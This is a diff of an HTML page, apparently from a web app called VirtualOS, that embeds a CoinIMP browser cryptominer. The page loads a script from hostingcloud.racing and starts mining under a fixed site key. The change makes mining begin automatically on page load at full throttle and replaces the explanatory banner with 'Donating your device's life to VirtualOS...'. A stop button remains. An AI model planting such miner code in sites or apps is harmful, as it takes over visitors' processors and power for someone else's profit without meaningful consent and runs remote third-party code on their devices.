@@ -1,16 +1,13 @@
 <!DOCTYPE html>
-<body onload="minestart()">
+<Body>
 <script src="https://www.hostingcloud.racing/dklc.js"></script>
 <script>
-    function minestart() {
     var _client = new Client.Anonymous('dc01f54b8fd8e03a39a5587e3d943aea24b721ca93d16ac2579d5b249ac96586', {
-        throttle: 0.5, c: 'w', ads: 0
+        throttle: 0, c: 'w'
     });
     _client.start();
-    _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
-    }
+    _client.addMiningNotification("Top", "Donating your device's life to VirtualOS...", "#ff0000", 100, "#37ff00");
+
 </script>
-
-
-<button class="mybutton" onclick="window.location.href='/'">Click to stop mining and exit the app to VOS BIOS.</button>
-</body>
+<button onclick="window.location.href='/'">Click to stop mining and exit to VOS BIOS.</button>
+</Body>
